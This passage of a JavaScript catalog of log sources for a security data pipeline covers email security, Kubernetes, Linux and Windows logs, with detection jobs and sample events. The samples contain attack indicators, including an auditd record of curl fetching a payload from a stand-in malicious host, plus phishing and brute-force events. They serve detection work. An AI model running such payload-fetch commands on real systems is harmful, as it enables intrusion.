            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for phishing campaigns, BEC impersonation patterns, and weaponized attachment delivery with sender reputation correlation' },
            { persona: 'Data End User / Analyst', job: 'Investigate Business Email Compromise by correlating DMARC/SPF failures with sender domain age and impersonation scoring to identify active campaigns within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect targeted phishing by identifying emails bypassing outbreak filters with suspicious attachment hashes or URL rewrites from low-reputation senders' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress clean delivery confirmations and routine spam rejections, reducing Cisco Secure Email log volume by 50-65% while preserving all threat verdicts' },
            { persona: 'Data Engineer', job: 'Route AMP malicious verdicts, DLP matches, and phishing detections to SIEM while batching full message tracking logs to Lake for forensic search' },
            { persona: 'Team Leader', job: 'Demonstrate email security log optimization ROI with per-verdict-type volume breakdown and maintained detection SLA for phishing and BEC alerts' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete email DLP audit trail with attachment metadata for 13+ months to satisfy regulatory data handling requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate DLP policy violation reports showing sensitive content matches by sender, recipient domain, and content filter action within 15 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor email delivery health including queue depth, deferred message rates, and anti-spam engine performance to detect gateway degradation within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track sender reputation score trends and outbreak filter activation frequency to measure email security effectiveness and tune policies' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (TCP/TLS from ESA/CES) / Cisco SMA centralized tracking / API (AsyncOS REST) / Consolidated Event Logs (CEL)',
        logFormat: 'Structured syslog with multiple log types: mail_logs (message tracking), amp (AMP verdicts), authentication (SPF/DKIM/DMARC), content_filter, anti_spam, antivirus, dlp. Key fields: MID, ICID, DCID, from, to, subject, action, verdict, score, attachment_name.',
        avgEPS: '2,000-50,000 EPS depending on email volume and filter verbosity',
        sampleEvent: 'Jun  6 14:32:08 esa01.corp.example.com mail_logs: Info: MID 12345678 ICID 87654321 From: <attacker@suspicious-domain.xyz> To: <jperks@cribl.io> Subject: "Urgent: Invoice Payment Required" Action: quarantined Reason: outbreak-filter Verdict: spam Score: 98 SPF: fail DKIM: none DMARC: fail Attachment: invoice_june.pdf.exe AMP: malicious SHA256: a1b2c3d4e5f67890 ThreatName: W32.Phishing.Trojan Reputation: -8.5 SenderGroup: BLOCKLIST'
      },
      {
        id: 'proofpoint-email',
        name: 'Proofpoint Email Protection & TAP',
        vendor: 'Proofpoint',
        description: 'Email message trace, threat detection (TAP), URL defense clicks, and quarantine events from Proofpoint Email Protection. Covers inbound/outbound message flow with full threat intelligence including sandboxed attachment analysis and URL rewriting outcomes.',
        status: 'available',
        useCases: ['Phishing Detection', 'BEC Prevention', 'Malware Delivery Tracking', 'Email Flow Monitoring', 'Quarantine Management', 'URL Click Tracking', 'Executive Protection'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Compliance', 'IT Operations'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection workflows correlating Proofpoint TAP alerts with endpoint activity to identify successful phishing leading to credential theft or malware execution' },
            { persona: 'Data End User / Analyst', job: 'Track URL defense clicks to identify users who clicked rewritten malicious links and assess potential compromise scope' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor email delivery pipeline health — queue depth, delivery latency, bounce rates, and policy engine processing time' },
            { persona: 'Data End User / Analyst', job: 'Track quarantine volume trends and false positive rates to tune email policies without business disruption' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter clean delivered message metadata (80%+ of email volume) to Lake while routing threats, quarantines, and policy actions to SIEM — reducing ingest by 70-80%' },
            { persona: 'Data Engineer', job: 'Suppress NDR bounce-back detail and marketing email tracking that inflates volume with no security value' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Proofpoint SIEM API (TAP + Message Trace) integration with proper deduplication across multiple log streams' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (TAP SIEM API) / Syslog / Log streaming',
        logFormat: 'JSON — fields include GUID, sender, recipient, subject, messageTime, threatsInfoMap (threat, classification, url), clickTime, clickIP, classification, quarantineFolder, policyRoutes, phishScore, spamScore, impostorScore.',
        avgEPS: '2,000-20,000 EPS (scales with email volume; TAP threat events are subset)',
        sampleEvent: '{"GUID":"a1b2c3d4-e5f6-7890","sender":"hr-benefits@company-update.com","recipient":"mthompson@cribl.io","subject":"Action Required: Update Your Direct Deposit Information","messageTime":"2026-06-11T14:32:08Z","senderIP":"185.234.72.11","classification":"phish","phishScore":99,"spamScore":45,"impostorScore":92,"threatsInfoMap":[{"threat":"https://company-update.com/hr-portal/login","threatType":"url","classification":"phish","threatTime":"2026-06-11T14:32:10Z"}],"quarantineFolder":"Phishing","policyRoutes":["default_inbound","phish_quarantine"],"messageSize":15234,"headerFrom":"HR Benefits <benefits@company.com>","replyTo":"reply-a1b2c3@gmail.com"}'
      },
      {
        id: 'mimecast-email',
        name: 'Mimecast Email Security & TTP',
        vendor: 'Mimecast',
        description: 'Email security logs from Mimecast covering Targeted Threat Protection (TTP) URL scans, impersonation detection, attachment sandboxing, message receipt/delivery, and DLP policy actions. Delivered via SIEM Integration API with structured JSON per log type.',
        status: 'available',
        useCases: ['Phishing Detection', 'URL Click Protection', 'Impersonation Detection', 'Attachment Sandboxing', 'Email DLP', 'Quarantine Management', 'Executive Protection'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Compliance', 'Email Administration'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections correlating Mimecast TTP URL click events with endpoint process creation to identify successful credential phishing leading to post-exploitation activity' },
            { persona: 'Data End User / Analyst', job: 'Investigate impersonation detections by correlating sender similarity scores with header analysis and recipient targeting patterns to confirm BEC campaigns' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor email processing latency, queue depth, attachment sandbox processing time, and delivery success rates to ensure email flow health' },
            { persona: 'Data End User / Analyst', job: 'Track TTP URL rewrite effectiveness and user click-through rates to measure security awareness impact' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter clean receipt/delivery logs (85%+ of volume) to Lake while routing TTP alerts, impersonation events, and DLP matches to SIEM — reducing ingest by 75-85%' },
            { persona: 'Data Engineer', job: 'Suppress internal-to-internal message tracking that generates high volume with minimal security value' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Mimecast SIEM Integration API polling with proper pagination and checkpoint management for reliable log collection' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (SIEM Integration API — /api/audit/get-siem-logs) / Syslog',
        logFormat: 'JSON — separate log types: ttp-url (url, scanResult, userOverride, action), ttp-impersonation (senderAddress, similarDomain, impersonatedUser), receipt (senderAddress, recipientAddress, subject, spamScore, rejectionType). Key shared fields: datetime, aCode, acc, id.',
        avgEPS: '2,000-30,000 EPS (receipts dominate volume; TTP alerts are low-volume high-value)',
        sampleEvent: '{"datetime":"2026-06-16T14:32:08+0000","aCode":"api_key_redacted","acc":"C0A0","id":"msg-TTP-a1b2c3","logType":"ttp-url","senderAddress":"hr-update@company-spoofed.com","recipientAddress":"mthompson@cribl.io","subject":"Verify Your Account Details","route":"inbound","url":"https://company-spoofed.com/login","scanResult":"malicious","action":"block","userOverride":"false","adminOverride":"N/A","urlCategory":"Phishing & Fraud","credentialTheft":"true","sendingIp":"185.234.72.11"}'
      }
    ]
  },
  {
    category: 'Kubernetes',
    icon: '⎈',
    sources: [
      {
        id: 'k8s-audit-logs',
        name: 'Kubernetes Audit Logs',
        vendor: 'CNCF',
        description: 'Kubernetes API server audit logs (audit.k8s.io/v1) capturing all requests to the control plane including resource CRUD, authentication decisions, RBAC evaluations, pod exec/portforward, and admission controller results. Events include actor identity, source IPs, target resource, request/response bodies, and authorization annotations.',
        status: 'available',
        useCases: ['Privilege Escalation', 'Secret Access Monitoring', 'Container Exec Detection', 'Suspicious API Access', 'RBAC Change Tracking', 'Deployment Failures', 'Control Plane Errors', 'Platform Change Tracking', 'Node Health Monitoring', 'Resource Quota Enforcement'],
        personas: ['Security Engineering', 'Platform Engineering', 'SRE', 'DevOps', 'Cloud Security', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for container exec into production pods, RBAC privilege escalation, secret access from unauthorized service accounts, and admission controller bypasses' },
            { persona: 'Data End User / Analyst', job: 'Investigate suspicious kubectl exec sessions by correlating API server audit events with source IPs, user identity, and RBAC role bindings within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying ClusterRoleBinding modifications granting cluster-admin to non-platform service accounts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor deployment failures and pod eviction rates across 50+ namespaces to detect resource quota exhaustion and scheduling issues within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track API server request latency and error rates by verb and resource to identify control plane degradation before workload impact' },
            { persona: 'Platform Administrator', job: 'Audit all resource modifications across clusters to maintain change management compliance and detect unauthorized infrastructure drift' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete Kubernetes API audit trail for 13+ months with user attribution to satisfy SOC2 infrastructure access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate RBAC compliance reports showing over-permissioned service accounts and ClusterRole bindings violating least-privilege policies' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume GET/LIST/WATCH audit events for health checks and controller reconciliation loops, reducing K8s audit volume by 65-80% for SIEM' },
            { persona: 'Data Engineer', job: 'Route create/delete/exec operations and RBAC changes to SIEM while sending full audit trail to Lake for forensic investigation' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Datadog', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Webhook Backend (HTTP/S to Cribl) / File Monitor (Cribl Edge on audit.log) / CloudWatch Logs (EKS) / Pub/Sub (GKE) / Event Hub (AKS)',
        sampleEvent: '{"apiVersion":"audit.k8s.io/v1","kind":"Event","level":"Metadata","auditID":"7e3c4a2b-1f8d-4e5c-9a6b-3d2c1e0f8a7b","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/production/pods/data-processor-7b4f8c6d9-xk2mz/exec?command=sh&stdin=true&stdout=true&tty=true","verb":"create","user":{"username":"jordan.perks@cribl.io","groups":["engineering","system:authenticated"]},"sourceIPs":["10.128.0.45"],"userAgent":"kubectl/v1.29.2 (linux/amd64)","objectRef":{"resource":"pods","namespace":"production","name":"data-processor-7b4f8c6d9-xk2mz","apiVersion":"v1","subresource":"exec"},"responseStatus":{"code":101,"status":"Success"},"requestReceivedTimestamp":"2026-06-06T14:22:01.234567Z","stageTimestamp":"2026-06-06T14:22:01.298432Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":"RBAC: allowed by ClusterRoleBinding \\"engineering-deploy\\" of ClusterRole \\"deploy-manager\\" to Group \\"engineering\\""}}'
      }
    ]
  },
  {
    category: 'Operating System',
    icon: '🐧',
    sources: [
      {
        id: 'linux-auditd',
        name: 'Linux Auditd Logs',
        vendor: 'Linux Kernel',
        description: 'Kernel-level audit logs from the Linux Audit Framework (auditd). Captures syscall-level process execution (execve), file access (open/read/write/unlink), network connections (connect/accept/bind), user authentication, privilege escalation (setuid/setgid), kernel module loading, and security policy decisions. Events use key=value pair format grouped by audit ID.',
        status: 'available',
        useCases: ['Process Execution Monitoring', 'File Integrity Monitoring', 'Privilege Escalation Detection', 'Unauthorized Access Attempts', 'Kernel Module Tampering', 'Data Exfiltration Detection', 'Compliance Auditing (PCI/HIPAA/SOX)', 'Insider Threat Detection', 'Container Escape Detection'],
        personas: ['Security Engineering', 'SOC', 'Compliance', 'Incident Response', 'Threat Hunting', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for unauthorized file access, suspicious process execution (execve), privilege escalation via setuid, and kernel module loading with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Hunt for insider threats by correlating file access patterns with user identity and session context to detect unauthorized data access within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect container escape attempts by identifying unexpected syscalls (mount, ptrace, unshare) from containerized processes targeting host namespaces' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain immutable file integrity audit trail with syscall-level evidence for 13+ months to satisfy PCI-DSS Section 10 and HIPAA access logging requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing file access to sensitive paths (/etc/shadow, /etc/passwd, certificate stores) with user attribution and timestamps' },
            { persona: 'Team Leader', job: 'Demonstrate audit coverage completeness showing 100% of critical system calls monitored across production Linux fleet with zero gaps' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume syscall noise (routine stat/open calls from monitoring agents) reducing auditd volume by 60-75% while preserving security-relevant events' },
            { persona: 'Data Engineer', job: 'Route execve, file modification, and privilege escalation events to SIEM while sending full syscall audit to Lake for forensic investigation' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge file monitor on /var/log/audit/audit.log with multi-line event reassembly and deliver parsed events within 20 minutes per host' },
            { persona: 'Data Engineer', job: 'Parse auditd key=value format into structured fields and correlate multi-record audit events by audit ID for complete execution context' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/audit/audit.log) / audisp-remote plugin (syslog forwarding) / auditd log shipping via rsyslog',
        sampleEvent: 'type=SYSCALL msg=audit(1717680001.234:28764): arch=c000003e syscall=59 success=yes exit=0 a0=55b3a1c2e340 a1=55b3a1c2e3a0 a2=55b3a1c2e3b0 a3=7ffd4a2b1c80 items=2 ppid=4521 pid=4522 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" subj=unconfined_u:unconfined_r:unconfined_t:s0 key="exec_monitor"\ntype=EXECVE msg=audit(1717680001.234:28764): argc=3 a0="curl" a1="-s" a2="http://suspicious-domain.xyz/payload"\ntype=PATH msg=audit(1717680001.234:28764): item=0 name="/usr/bin/curl" inode=1048721 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL'
      },
      {
        id: 'linux-auth',
        name: 'Linux Auth / Secure Logs',
        vendor: 'Linux (PAM/SSH/sudo)',
        description: 'Authentication and authorization logs from /var/log/secure (RHEL/CentOS) or /var/log/auth.log (Debian/Ubuntu). Captures SSH authentication success/failure, sudo command execution, su user switching, PAM session events, account creation/modification, password changes, and systemd-logind session tracking.',
        status: 'available',
        useCases: ['SSH Brute Force Detection', 'Unauthorized Sudo Usage', 'Privilege Escalation', 'Account Compromise', 'Credential Stuffing', 'Lateral Movement via SSH', 'Insider Threat Monitoring', 'Compliance Access Auditing', 'Service Account Abuse'],
        personas: ['Security Engineering', 'SOC', 'Compliance', 'Incident Response', 'Platform Engineering', 'SRE'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for SSH brute force (10+ failures in 60s), sudo abuse to unauthorized commands, and credential compromise via password spray patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate lateral movement by correlating successful SSH authentications with source IP reputation and impossible travel between Linux hosts within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect credential compromise by identifying successful logins from new IPs immediately following brute force sequences against the same account' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete privileged access audit trail capturing all sudo commands and su session switches for 13+ months to satisfy SOC2 access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate privileged access reports showing sudo usage by user, command, and host with exception flagging for non-standard privilege escalation paths' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate repetitive PAM session open/close events and CRON authentication entries, reducing auth log volume by 45-60% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route authentication failures, sudo commands, and account modifications to SIEM while sending successful SSH sessions to Lake for baseline analysis' },
            { persona: 'Team Leader', job: 'Quantify auth log optimization savings per-host showing detection coverage maintained with 50%+ volume reduction across 500+ Linux servers' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SSH service availability and PAM module errors across Linux fleet to detect authentication infrastructure issues within 2 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track account lockout patterns and password change frequency to identify service accounts with credential rotation failures' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/secure or /var/log/auth.log) / rsyslog TCP/TLS forwarding / journald export',
        sampleEvent: 'Jun  6 14:32:08 prod-web-01 sshd[24601]: Accepted publickey for jperks from 10.0.1.42 port 52341 ssh2: RSA SHA256:abc123def456\nJun  6 14:32:15 prod-web-01 sudo: jperks : TTY=pts/0 ; PWD=/home/jperks ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx\nJun  6 14:33:01 prod-web-01 sshd[24890]: Failed password for invalid user admin from 203.0.113.99 port 44521 ssh2'
      },
      {
        id: 'linux-syslog',
        name: 'Linux System Logs (syslog/journald)',
        vendor: 'Linux (systemd/kernel)',
        description: 'System-level logs from syslog (/var/log/messages, /var/log/syslog) and journald covering kernel messages, systemd unit lifecycle events, OOM kills, hardware errors, disk I/O failures, network interface changes, SELinux/AppArmor denials, service crashes, and resource exhaustion events.',
        status: 'available',
        useCases: ['OOM Kill Detection', 'Service Crash Monitoring', 'Disk Failure Detection', 'Network Interface Monitoring', 'SELinux Denial Tracking', 'Resource Exhaustion Alerting', 'Package Change Tracking', 'Boot/Shutdown Analysis', 'Hardware Error Detection'],
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Security Engineering', 'DevOps'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Detect OOM kills and service crashes within 60 seconds by correlating kernel messages with systemd unit failure events across 500+ hosts' },
            { persona: 'Data End User / Analyst', job: 'Track disk I/O error trends (EXT4 errors, SCSI timeouts) per host to predict storage failures 24-48 hours before data loss' },
            { persona: 'Jack of All Trades', job: 'Identify resource exhaustion cascades by correlating OOM events with service restart patterns and CPU/memory threshold breaches' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for SELinux/AppArmor denial spikes indicating exploitation attempts, unauthorized kernel module loads, and suspicious network interface changes' },
            { persona: 'Data End User / Analyst', job: 'Investigate security-relevant syslog events by correlating SELinux denials with process context to identify policy bypass attempts within 10 minutes' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress repetitive systemd status messages and periodic health check outputs, reducing syslog volume by 50-70% while preserving error and warning events' },
            { persona: 'Data Engineer', job: 'Route kernel errors, OOM kills, and service failures to SIEM/monitoring while sending full syslog to Lake for root cause analysis and capacity planning' },
            { persona: 'Team Leader', job: 'Present syslog optimization metrics showing per-facility volume reduction with maintained alerting coverage for critical infrastructure events' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Scale syslog collection across 1000+ Linux hosts with centralized Edge fleet management and automatic log rotation handling' },
            { persona: 'Data Onboarder', job: 'Deploy Cribl Edge file monitor on /var/log/messages with facility-based routing to multiple destinations within 15 minutes per host group' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'New Relic', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (File Monitor on /var/log/messages or /var/log/syslog) / rsyslog TCP/TLS / journald-upload / systemd-journal-remote',
        sampleEvent: 'Jun  6 14:32:08 prod-db-01 kernel: [4521678.123] Out of memory: Killed process 8921 (java) total-vm:8234567kB, anon-rss:4125678kB, file-rss:0kB, shmem-rss:0kB, UID:1001 pgtables:16384kB oom_score_adj:0\nJun  6 14:32:09 prod-db-01 systemd[1]: postgresql.service: Main process exited, code=killed, status=9/KILL\nJun  6 14:32:10 prod-db-01 kernel: [4521678.456] EXT4-fs error (device sda1): ext4_lookup:1234: inode #567890: comm systemd-journald: deleted inode referenced'
      }
    ]
  },
  {
    category: 'Windows',
    icon: '🪟',
    sources: [
      {
        id: 'windows-security',
        name: 'Windows Security Event Log',
        vendor: 'Microsoft',
        description: 'Windows Security Event Log capturing authentication events (4624/4625), privilege use (4672/4673), account management (4720-4738), object access (4656-4663), policy changes (4719), and process tracking (4688). The primary source for Windows endpoint and server security monitoring.',
        status: 'available',
        useCases: ['Logon Anomaly Detection', 'Brute Force Detection', 'Privilege Escalation', 'Lateral Movement', 'Account Manipulation', 'Process Execution Monitoring', 'Pass-the-Hash/Ticket', 'Credential Dumping', 'Compliance Auditing', 'Service Account Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Compliance', 'Threat Hunting', 'Identity Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 12+ detection rules for logon anomalies (Type 10 from unusual IPs), credential theft (4648 explicit creds), privilege escalation (4672 abuse), and pass-the-hash patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate credential theft by correlating 4625 failure sequences with subsequent 4624 successes from different source IPs to identify compromised accounts within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect lateral movement by identifying Type 3 network logons from non-admin workstations to sensitive servers using service accounts outside business hours' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume logon Type 3 events from known service accounts and machine accounts, reducing Windows Security log volume by 50-65% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route 4625/4648/4672/4720-4738 security events to SIEM while sending routine 4624 success events to Lake for baseline analysis and forensic search' },
            { persona: 'Team Leader', job: 'Demonstrate Windows Security log optimization savings per-DC with event ID volume breakdown showing maintained detection for all credential attack patterns' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete Windows authentication audit trail for 13+ months across all domain controllers to satisfy SOC2/PCI-DSS access logging requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate privileged account usage reports showing 4672 special privilege assignments and account management changes by actor and time window' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor account lockout patterns (4740) and Kerberos failures (4771) across DCs to detect authentication infrastructure issues within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track service account logon patterns to identify credential rotation failures and unauthorized service account usage across the domain' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / Windows Event Forwarding (WEF/WEC) / NXLog / Splunk UF',
        logFormat: 'Windows Event Log XML (EVTX) — structured with EventID, keywords, task category. Key EventIDs: 4624-4625 (logon), 4648 (explicit creds), 4672 (special privs), 4688 (process create), 4720-4738 (account mgmt).',
        avgEPS: '1,000-15,000 EPS per server depending on role and audit policy',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/><EventID>4625</EventID><Level>0</Level><Task>12544</Task><Keywords>0x8010000000000000</Keywords><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>SRV01.corp.example.com</Computer></System><EventData><Data Name="TargetUserName">admin</Data><Data Name="TargetDomainName">CORP</Data><Data Name="Status">0xC000006D</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.99</Data><Data Name="IpPort">52341</Data><Data Name="SubStatus">0xC000006A</Data><Data Name="WorkstationName">ATTACKER-PC</Data></EventData></Event>'
      },
      {
        id: 'windows-system',
        name: 'Windows System Event Log',
        vendor: 'Microsoft',
        description: 'Windows System Event Log recording OS-level events including service start/stop (7035-7036), driver failures (7000-7001), time sync issues (129), disk errors (7, 9, 11, 15, 51, 153), BSOD bugcheck (1001), Windows Update (19/20), and network adapter events. Critical for infrastructure health monitoring.',
        status: 'available',
        useCases: ['Service Crash Monitoring', 'Driver Failure Detection', 'Disk Health Alerting', 'Time Sync Monitoring', 'Blue Screen Analysis', 'Windows Update Tracking', 'Network Adapter Issues', 'Unexpected Reboot Detection', 'System Resource Exhaustion', 'Cluster Failover Events'],
        personas: ['SRE', 'Platform Engineering', 'NOC', 'Windows Administration', 'DevOps', 'Security Engineering'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Detect service crashes (7034) and unexpected reboots (41/6008) within 60 seconds to initiate incident response before cascading failures impact SLA' },
            { persona: 'Data End User / Analyst', job: 'Track disk error trends (Event IDs 7/11/15/51/153) per server to predict storage failures and trigger proactive replacement within 48-hour maintenance windows' },
            { persona: 'Jack of All Trades', job: 'Correlate Windows Update events (19/20) with subsequent service failures and reboots to identify problematic patches within 24 hours of deployment' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for suspicious service installations (7045), driver load failures from unsigned binaries, and time sync manipulation indicating timestomping attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate unexpected service stop events by correlating with process execution and user logon context to differentiate maintenance from attacker activity' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine service start/stop cycles and informational driver events, reducing Windows System log volume by 55-70% while preserving error and warning-level events' },
            { persona: 'Data Engineer', job: 'Route disk errors, BSOD bugchecks, and unexpected reboots to SIEM/monitoring while sending full System log to Lake for trend analysis and capacity planning' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Track Windows Update compliance across fleet showing patch installation status, reboot pending duration, and failed update rates per server group' },
            { persona: 'Data End User / Analyst', job: 'Generate infrastructure health compliance reports showing uptime metrics, disk health trends, and service availability by server role and criticality tier' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Datadog', 'Dynatrace', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cribl Edge (Windows Event Logs input) / Windows Event Forwarding (WEF/WEC) / NXLog / SNMP traps',
        logFormat: 'Windows Event Log XML (EVTX). Key EventIDs: 6005/6006 (startup/shutdown), 7034-7036 (service control), 41 (unexpected reboot), 1001 (bugcheck), 129 (time sync), 7/11/15/51/153 (disk).',
        avgEPS: '200-3,000 EPS per server depending on role and health',
        sampleEvent: '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931d2012f4}"/><EventID>7036</EventID><Level>4</Level><TimeCreated SystemTime="2026-06-06T14:32:08.123Z"/><Computer>SRV01.corp.example.com</Computer></System><EventData><Data Name="param1">Windows Update</Data><Data Name="param2">stopped</Data></EventData></Event>'
      },
      {
        id: 'windows-application',
        name: 'Windows Application Event Log',
        vendor: 'Microsoft',
        description: 'Windows Application Event Log capturing application-level events including .NET runtime errors (1026), application crashes (1000/1002), MSI installer events (1033/1040), MSSQL errors, IIS/W3SVC events, and custom application logging. Key source for application reliability and troubleshooting.',
        status: 'available',
        useCases: ['Application Crash Monitoring', 'Memory Leak Detection', '.NET Exception Tracking', 'Database Error Alerting', 'Installer/Deployment Tracking', 'Application Hang Detection', 'License Expiry Warnings', 'Custom App Health Metrics', 'Certificate Store Events'],
        personas: ['SRE', 'Application Development', 'Platform Engineering', 'NOC', '.NET Team', 'DBA'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Detect application crashes (1000) and .NET runtime exceptions (1026) within 90 seconds to initiate remediation before user-facing impact exceeds 5-minute SLA' },
